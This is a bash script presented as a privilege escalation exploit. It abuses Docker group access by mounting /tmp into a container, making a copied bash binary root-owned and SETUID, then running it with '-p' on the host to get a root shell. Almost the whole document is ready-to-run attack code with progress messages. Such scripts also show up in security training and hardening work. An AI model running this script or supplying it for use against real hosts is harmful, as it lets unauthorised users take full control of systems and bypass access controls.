#!/bin/bash

# This is a simple script for a privilege escalation exploit
# leveraging non-privileged containers. Essentially, starting
# from a simple user inside a system which cannot access to
# privileges commands except for running containers in a non-
# privileged way, we can create a new container and escape from
# it and then gain root privileges. 
# 
# Exploit: CAP_CHOWN capability, SETUID permissions

GREEN='\033[0;32m'
NC='\033[0m'
RED='\033[0;31m'

echo -e "${GREEN}[*] Copying /bin/bash to /tmp${NC}"
cp /bin/bash /tmp

echo -e "${GREEN}[*] Running a Docker container with /tmp mounted in /mnt/host${NC}"
echo -e "${GREEN}    Once inside the container runs this commands${NC}"
echo -e "${GREEN}    $ cd /mnt/host${NC}"
echo -e "${GREEN}    $ chown root:root bash${NC}"
echo -e "${GREEN}    $ chmod u+s bash${NC}"
echo -e "${GREEN}    $ exit${NC}"
docker run --rm -it -v /tmp:/mnt/host ubuntu bash

echo -e "${GREEN}[*] Check SETUID bit set succesfully${NC}"
if [ -z $(stat -L -c "%A" /tmp/bash | cut -c4 | grep -E "^s$") ]; then
	echo -e "${RED}[*] SETUID is not set${NC}";
	exit 1
fi;

echo -e "${GREEN}[*] Executing './bash -p'${NC}"
/tmp/bash -p

echo -e "${GREEN}[*] Removing bash from /tmp${NC}"
sudo rm /tmp/bash

echo -e "${GREEN}[*] Exiting ...${NC}"
exit 0
